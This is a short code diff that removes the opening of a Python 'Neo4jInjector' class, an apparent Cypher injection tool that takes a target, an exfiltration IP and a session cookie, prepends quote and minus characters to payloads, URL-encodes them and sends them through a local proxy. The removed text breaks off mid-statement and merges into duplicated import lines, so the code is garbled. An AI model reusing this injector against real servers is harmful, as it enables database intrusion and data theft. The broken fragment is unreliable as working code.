@@ -1,38 +1,6 @@
 import argparse
 import requests
 import urllib.parse
-
-class Neo4jInjector:
-    def __init__(self, target, exfil_ip, request_type, parameters, cookie=None):
-        self.target = target
-        self.exfil_ip = exfil_ip
-        self.request_type = request_type
-        self.parameters = parameters
-        # Check if a cookie was provided and split it into a dictionary if so
-        self.cookie = {cookie.split('=')[0]: cookie.split('=')[1]} if cookie else None
-        self.headers = {
-            'User-Agent': 'curl/8.5.0',
-            'Content-Type': 'application/x-www-form-urlencoded',
-        }
-        self.proxies = {
-            'http': 'http://127.0.0.1:8080',
-        }
-
-    def inject_payload(self, payload):
-        injection_characters = ["-1", "'", "\""]
-        for injection_character in injection_characters:
-            full_payload = injection_character + payload
-            encoded_payload = urllib.parse.quote(full_payload, safe='')
-            url, data = self.prepare_request_data(encoded_payload)
-            self.execute_request(url, data)
-
-    def prepare_request_data(self, encoded_payload):
-        if self.request_type == "API":
-            url = self.target + self.parameters + encoded_payload
-            data = None
-        elif self.request_type == "GET":import argparse
-import requests
-import urllib.parse
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
